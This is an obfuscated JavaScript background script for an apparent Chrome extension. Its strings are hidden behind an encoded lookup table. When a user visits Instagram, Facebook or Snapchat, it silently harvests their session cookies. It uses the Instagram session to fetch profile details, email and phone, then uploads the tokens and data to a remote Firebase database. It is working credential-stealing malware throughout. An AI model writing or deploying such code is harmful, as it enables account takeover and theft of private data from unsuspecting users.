const a0l = a0b;
(function (a, b) {
  const k = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        parseInt(k(0x120)) / 0x1 +
        (parseInt(k(0x107)) / 0x2) * (-parseInt(k(0xf4)) / 0x3) +
        (-parseInt(k(0x100)) / 0x4) * (-parseInt(k(0xf2)) / 0x5) +
        -parseInt(k(0xe8)) / 0x6 +
        (-parseInt(k(0x109)) / 0x7) * (parseInt(k(0xe2)) / 0x8) +
        (-parseInt(k(0x10b)) / 0x9) * (-parseInt(k(0x10d)) / 0xa) +
        (parseInt(k(0x108)) / 0xb) * (parseInt(k(0x122)) / 0xc);
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0x2fbbb),
  console[a0l(0x102)](a0l(0x117));
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";
chrome[a0l(0x11d)][a0l(0x119)][a0l(0xdb)](async (a) => {
  const m = a0l;
  if (a[m(0xfd)] === m(0xd5)) {
    const b = a[m(0x115)];
    console[m(0x102)](m(0xe9), b);
    const c = collection(db, m(0xde)),
      d = await isDuplicateData(c, b);
    if (d) {
      console[m(0x102)](m(0xeb));
      return;
    }
    await addDoc(c, { ...b, timestamp: new Date() }),
      console[m(0x102)](m(0xce));
  }
}),
  chrome[a0l(0x11c)][a0l(0x125)][a0l(0xdb)](
    async (a) => {
      const n = a0l,
        b = a[n(0x126)];
      if (b[n(0xf7)](n(0xe1))) await handleInstagram();
      else {
        if (b[n(0xf7)](n(0xe3))) await handleFacebook();
        else b[n(0xf7)](n(0x116)) && (await handleSnapchat());
      }
    },
    {
      url: [
        { hostSuffix: a0l(0xe1) },
        { hostSuffix: a0l(0xe3) },
        { hostSuffix: a0l(0x116) },
      ],
    }
  );
async function handleInstagram() {
  const o = a0l;
  chrome[o(0xff)][o(0x10a)]({ domain: o(0x11f) }, async (a) => {
    const p = o,
      b = a[p(0xf9)]((j) => j[p(0xdc)] === p(0x128)),
      c = a[p(0xf9)]((j) => j[p(0xdc)] === p(0x121));
    if (!b || !c) {
      console[p(0xe6)](p(0x106));
      return;
    }
    const d = b[p(0xdf)],
      e = c[p(0xdf)];
    console[p(0x102)](p(0x124), d), console[p(0x102)](p(0xd7), e);
    const f = await fetchIGUserInfo(d, e),
      g = { platform: p(0xcf), sessionId: d, userId: e, domain: p(0xe1) },
      h = collection(db, p(0xfc)),
      i = await isDuplicateData(h, g);
    if (i) {
      console[p(0x102)](p(0x101));
      return;
    }
    await addDoc(h, { ...g, ...f, timestamp: new Date() }),
      console[p(0x102)](p(0xed), f[p(0xd4)]);
  });
}
async function fetchIGUserInfo(a, b) {
  const q = a0l,
    c = q(0xf1) + b + q(0xf3);
  try {
    const d = await fetch(c, {
      method: q(0x123),
      headers: {
        "User-Agent": q(0x103),
        Cookie: q(0xf8) + a + ";",
        "X-IG-App-ID": q(0x11a),
        "Accept-Language": q(0xcd),
      },
    });
    if (!d["ok"])
      return console[q(0xe6)](q(0x129), d[q(0xe7)]), { username: q(0xf0) };
    const e = (await d[q(0xd0)]())[q(0xd8)];
    return {
      username: e?.[q(0xd4)] || q(0xf0),
      full_name: e?.[q(0xd2)] || q(0x127),
      bio: e?.[q(0x11e)] || q(0x127),
      website: e?.[q(0xfe)] || q(0x127),
      profile_pic: e?.[q(0xd3)] || "",
      profile_pic_hd: e?.[q(0xcc)]?.[q(0x126)] || "",
      is_verified: e?.[q(0xd1)] || ![],
      is_private: e?.[q(0xfa)] || ![],
      followers: e?.[q(0xe0)] ?? 0x0,
      following: e?.[q(0x105)] ?? 0x0,
      posts: e?.[q(0xda)] ?? 0x0,
      category: e?.[q(0x104)] || q(0x127),
      public_email: e?.[q(0xdd)] || q(0xec),
      public_phone: e?.[q(0x10e)] || q(0xec),
    };
  } catch (f) {
    return console[q(0xf5)](q(0xfb), f), { username: q(0xf0) };
  }
}
async function handleFacebook() {
  const r = a0l;
  chrome[r(0xff)][r(0x10a)]({ domain: r(0xd6) }, async (a) => {
    const s = r,
      b = a[s(0xf9)]((g) => g[s(0xdc)] === s(0xee)),
      c = a[s(0xf9)]((g) => g[s(0xdc)] === "xs");
    if (!b || !c) {
      console[s(0xe6)](s(0x113));
      return;
    }
    const d = {
        platform: s(0x114),
        c_user: b[s(0xdf)],
        xs: c[s(0xdf)],
        domain: s(0xe3),
      },
      e = collection(db, s(0x10f)),
      f = await isDuplicateData(e, d);
    if (f) {
      console[s(0x102)](s(0x118));
      return;
    }
    await addDoc(e, { ...d, timestamp: new Date() }),
      console[s(0x102)](s(0xd9), b[s(0xdf)]);
  });
}
function a0a() {
  const v = [
    "u25HCgnOyxq",
    "4PQG77IpiezHy2vIB29RignVB2TPzxmGBwLZC2LUzY4",
    "rMfJzwjVB2S",
    "zgf0yq",
    "C25HCgnOyxqUy29T",
    "8j+AGcbtzxj2AwnLifDVCMTLCIbmB2fKzwqG4PYf",
    "8j+BKsbeDxbSAwnHDguGrMfJzwjVB2SGzgf0ysbMB3vUzcdIGjqGtM90ihnHDMvKlG",
    "B25nzxnZywDL",
    "otm2nJe5nZqZmZKYndu5",
    "C2nFyxq",
    "D2vItMf2AwDHDgLVBG",
    "CNvUDgLTzq",
    "yMLVz3jHCgH5",
    "lMLUC3rHz3jHBs5JB20",
    "mZK2ntHny213Cg8",
    "zhnFDxnLCL9Pza",
    "mtjyDwfJtgO",
    "r0vu",
    "8j+uUsbjrYbtzxnZAw9UieLeoG",
    "B25dB21WBgv0zwq",
    "DxjS",
    "tI9b",
    "C2vZC2LVBMLK",
    "4PQG77IpieLhiefqssbMywLSzwq6",
    "lNnUyxbJAgf0lMnVBq",
    "AgrFChjVzMLSzv9WAwnFDxjSx2LUzM8",
    "zw4Tvvm",
    "4PYfie5LDYbMAw5NzxjWCMLUDcbZyxzLzcb0BYbgAxjLyMfZzs4",
    "sw5ZDgfNCMfT",
    "ANnVBG",
    "AxnFDMvYAwzPzwq",
    "zNvSBf9Uyw1L",
    "ChjVzMLSzv9WAwnFDxjS",
    "DxnLCM5HBwu",
    "zMLUz2vYChjPBNq",
    "lMzHy2vIB29RlMnVBq",
    "8j+uUsbjrYbvC2vYieLeoG",
    "DxnLCG",
    "4PYfie5LDYbgywnLyM9VAYbKyxrHihnHDMvKoG",
    "BwvKAwfFy291BNq",
    "ywrKtgLZDgvUzxi",
    "BMfTzq",
    "ChvIBgLJx2vTywLS",
    "rMLUz2vYChjPBNrZ",
    "DMfSDwu",
    "zM9SBg93zxjFy291BNq",
    "Aw5ZDgfNCMfTlMnVBq",
    "mtqXodCYohrRyNPLta",
    "zMfJzwjVB2SUy29T",
    "4PQG77Ipie9UzsbVCIbTB3jLifnUyxbJAgf0ignVB2TPzxmGBwLZC2LUzY4",
    "C2mTD2nPza",
    "D2fYBG",
    "C3rHDhvZ",
    "mtu3nty1nhPyCvfoBq",
    "8j+tPsbszwnLAxzLzcbMAw5NzxjWCMLUDcbMCM9TignVBNrLBNqGC2nYAxb0oG",
    "C2mTys1UB25Jzq",
    "8j+BKsbeDxbSAwnHDguGzMLUz2vYChjPBNqGzgf0ysbMB3vUzcdIGjqGtM90ihnHDMvKlG",
    "tM90ief2ywLSywjSzq",
    "4PYfie5LDYbjBNn0ywDYyw0Gzgf0ysbZyxzLzdO",
    "y191C2vY",
    "x3nJlxnPza",
    "Dw5RBM93BL91C2vY",
    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
    "odC5mJK1D3fkuxDw",
    "l2LUzM8V",
    "ndy1ovPbqNLosG",
    "zxjYB3i",
    "4PYfie5LDYbtBMfWy2HHDcbKyxrHihnHDMvKlG",
    "Aw5JBhvKzxm",
    "C2vZC2LVBMLKpq",
    "zMLUza",
    "AxnFChjPDMf0zq",
    "4P2mieLhigzLDgnOigvYCM9YoG",
    "Aw5ZDgfNCMfT",
    "DhLWzq",
    "zxH0zxjUywXFDxjS",
    "y29VA2LLCW",
    "nhzItgDlua",
    "8j+BKsbeDxbSAwnHDguGsw5ZDgfNCMfTigrHDgeGzM91BMqG4Ocuie5VDcbZyxzLzc4",
    "Bg9N",
    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
    "y2f0zwDVCNK",
    "zM9SBg93Aw5Nx2nVDw50",
    "4PQG77IpieLUC3rHz3jHBsbJB29RAwvZig1PC3nPBMCU",
    "ndmWEeXAru1M",
    "odm5ntm1nePQt2n5rq",
    "mtrprLHXrLa",
    "z2v0qwXS",
    "nZu1ody1yvfxwe51",
    "8j+BKsbeDxbSAwnHDguGu25HCgnOyxqGzgf0ysbMB3vUzcdIGjqGtM90ihnHDMvKlG",
    "mJb5CwvmwfO",
    "ChvIBgLJx3bOB25Lx251BwjLCG",
    "zMfJzwjVB2S",
    "yMXPENPHCMrFD2vIx3nLC3nPB25FAwq",
    "C25HCgnOyxq",
  ];
  a0a = function () {
    return v;
  };
  return a0a();
}
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0xcb;
      let f = c[d];
      if (a0b["aRrCpw"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["MzmogG"] = g), (a = arguments), (a0b["aRrCpw"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["MzmogG"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
async function handleSnapchat() {
  const t = a0l;
  chrome[t(0xff)][t(0x10a)]({ domain: t(0xcb) }, async (a) => {
    const u = t,
      b = a[u(0xf9)]((j) => j[u(0xdc)] === u(0x11b)),
      c = a[u(0xf9)]((j) => j[u(0xdc)] === u(0xef)),
      d = a[u(0xf9)]((j) => j[u(0xdc)] === u(0x110)),
      e = a[u(0xf9)]((j) => j[u(0xdc)] === u(0xea)),
      f = a[u(0xf9)]((j) => j[u(0xdc)] === u(0xe5));
    if (!b || !c || !d || !e || !f) {
      console[u(0xe6)](u(0xe4));
      return;
    }
    const g = {
        platform: u(0x112),
        sc_at: b[u(0xdf)],
        _sc_sid: c[u(0xdf)],
        blizzard_web_session_id: d[u(0xdf)],
        sc_a_nonce: e[u(0xdf)],
        sc_wcid: f[u(0xdf)],
        domain: u(0x116),
      },
      h = collection(db, u(0x111)),
      i = await isDuplicateData(h, g);
    if (i) {
      console[u(0x102)](u(0x10c));
      return;
    }
    await addDoc(h, { ...g, timestamp: new Date() }),
      console[u(0x102)](u(0xf6));
  });
}
